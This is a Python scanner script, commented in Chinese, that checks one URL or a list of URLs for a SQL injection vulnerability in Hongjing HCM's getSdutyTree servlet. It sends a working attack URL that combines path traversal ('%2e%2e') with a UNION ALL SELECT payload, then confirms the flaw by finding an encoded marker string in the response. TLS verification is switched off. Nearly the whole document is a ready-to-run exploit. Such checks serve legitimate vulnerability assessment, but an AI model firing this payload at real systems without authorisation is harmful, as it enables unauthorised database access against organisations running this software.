#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/w_selfservice/oauthservlet/%2e%2e/%2e%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd"
  
        response = requests.get(attack_url, verify=False, timeout=10)
  
        if response.status_code == 200 and 'qxjpqjwUIWcKtHqhkYslITEIKSbtxYTRxTtXpWImhWfaMqvjzq' in response.text:
            print(f"{RED}URL [{url}] 可能存在宏景HCM getSdutyTree SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在宏景HCM getSdutyTree SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()